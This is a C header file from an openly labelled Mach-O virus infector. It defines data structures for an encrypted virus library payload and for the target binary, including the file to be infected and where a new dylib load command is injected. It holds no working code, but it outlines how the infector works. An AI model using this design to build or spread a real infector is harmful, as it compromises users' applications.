/*     _____                                                                  
 *  __|_    |__  ____   _  ______  ______  ______   __    _____  _____   ___  
 * |    |      ||    \ | ||   ___||   ___||   ___|_|  |_ /     \|     | |   | 
 * |    |      ||     \| ||   ___||   ___||   |__|_    _||     ||     \ |___| 
 * |____|    __||__/\____||___|   |______||______| |__|  \_____/|__|\__\|___| 
 *    |_____|                                                                 
 *
 * A mach-o virus infector
 *
 * Copyright (c) fG!, 2012,2013 - reverser@put.as - http://reverse.put.as
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 *  structures.h
 *  
 */

#ifndef boubou_infector_structures_h
#define boubou_infector_structures_h

#include <stdint.h>

struct virus_library_info
{
    uint8_t  *buffer;     // holds the virus library payload with encrypted bytes
    uint64_t size;        // the size of the virus library
    uint32_t cputype;
    uint32_t cpusubtype;
    uint32_t offset;
};

// structure that will hold the necessary to-be-injected target information
struct target_info
{
    uint8_t *buffer;               // holds pointer to buffer with target contents
    uint64_t fileSize;             // the total filesize of target binary (app or library)
    
    uint8_t  is64Bits;             // 1 for 64 bits
    uint32_t headerSize;           // size of mach_header/mach_header_64
    uint32_t nrLoadCmds;
    uint32_t sizeOfLoadCmds;
    uint64_t firstSectionAddress;  // hold the offset of the first section of program data
    uint64_t textAddress;          // __text address
    uint64_t textSize;
    uint64_t textOffset;           // __text section offset
    uint64_t cryptSectionOffset;   // crypt section offset
    uint32_t libLocation;          // address of the library command xxx
    uint32_t stringSize;           // the size of the library name string xxx
    uint8_t  libIndex;             // the library index xxx
    uint64_t entrypoint;
    uint32_t cputype;
    uint32_t cpusubtype;
    
    char *targetBinaryPath;        // location of the binary to be infected
    char *injectionTargetPath;     // location of the virus library
    char *injectionHeaderPath;     // the location to use at the header, slightly different from above
    char *injectionLibraryName;    // just the name to be used for virus library infection

    uint32_t injectionSize;        // the new dylib command total size
    uint8_t *injectionStartOffset; // the position where to add the new command
    
    struct virus_library_info virus;
};

typedef struct target_info target_info_t;

struct my_thread_command
{
    uint32_t cmd;
	uint32_t cmdsize;
	uint32_t flavor;
	uint32_t count;
};

typedef struct my_thread_command thread_command_t;

#endif
